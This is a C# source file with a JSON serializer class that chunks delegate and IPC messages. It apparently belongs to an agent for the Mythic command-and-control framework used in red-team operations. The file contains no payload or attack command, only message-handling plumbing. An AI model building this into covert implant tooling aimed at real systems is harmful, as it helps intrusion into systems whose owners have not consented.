using System;
using System.Linq;
using System.Text;
using PhantomInterop.Interfaces;
using System.IO;
using System.Runtime.Serialization.Json;
using PhantomInterop.Structs.PhantomStructs;
using PhantomInterop.Types;
using PhantomInterop.Enums.PhantomEnums;

namespace PhantomInterop.Serializers
{
    public class JsonHandler : ISerializer
    {
        //List<Type> _knownTypes = new List<Type>();
        public JsonHandler()
        {
            //Assembly interopAsm = Assembly.GetAssembly(typeof(TaskResponse));
            //foreach(Type t in interopAsm.GetTypes())
            //{
            //    if (t.FullName.StartsWith("PhantomInterop.Structs.MythicStructs") || t.FullName.StartsWith("PhantomInterop.Structs.PhantomStructs"))
            //    {
            //        _knownTypes.Add(t);
            //    }
            //}
        }

        public virtual string Serialize(object msg)
        {
            using (var ms = new MemoryStream())
            {
                var ser = new DataContractJsonSerializer(msg.GetType());
                ser.WriteObject(ms, msg);
                ms.Position = 0;
                using (var sr = new StreamReader(ms))
                {
                    string res = sr.ReadToEnd();
                    return res;
                }
            }
        }

        public virtual T Deserialize<T>(string msg)
        {
            using (var ms = new MemoryStream(Encoding.Unicode.GetBytes(msg)))
            {
                var deserializer = new DataContractJsonSerializer(typeof(T));
                return (T)deserializer.ReadObject(ms);
            }
        }

        public virtual object Deserialize(string msg, Type t)
        {
            using (var ms = new MemoryStream(Encoding.Unicode.GetBytes(msg)))
            {
                var deserializer = new DataContractJsonSerializer(t);
                return deserializer.ReadObject(ms);
            }
        }

        public virtual DataChunk[] SerializeDelegateMessage(string message, MessageType mt, int blockSize = 4096)
        {
            // This delegate message is already encoding from Mythic, so we just need to get the bytes
            byte[] bMsg = Encoding.UTF8.GetBytes(message);
            int numMessages = bMsg.Length / blockSize + 1;
            DataChunk[] ret = new DataChunk[numMessages];
            string id = Guid.NewGuid().ToString();
            for (int i = 0; i < numMessages; i++)
            {
                byte[] part = bMsg.Skip(i * blockSize).Take(blockSize).ToArray();
                ret[i] = new DataChunk(id, mt, i+1, numMessages, part);
            }
            return ret;
        }

        public virtual DataChunk[] SerializeIPCMessage(ICommandMessage message, int blockSize = 4096)
        {
            string msg = Serialize(message);
            byte[] bMsg = Encoding.UTF8.GetBytes(msg);
            int numMessages = bMsg.Length / blockSize + 1;
            DataChunk[] ret = new DataChunk[numMessages];
            var t = message.GetTypeCode();
            string id = Guid.NewGuid().ToString();
            for (int i = 0; i < numMessages; i++)
            {
                byte[] part = bMsg.Skip(i * blockSize).Take(blockSize).ToArray();
                ret[i] = new DataChunk(id, message.GetTypeCode(), i+1, numMessages, part);
            }
            return ret;
        }

        public virtual ICommandMessage DeserializeIPCMessage(byte[] data, MessageType mt)
        {
            string msg = Encoding.UTF8.GetString(data);
            Type t = MythicTypes.GetMessageType(mt);
            return (ICommandMessage)Deserialize(msg, t);
        }
    }
}
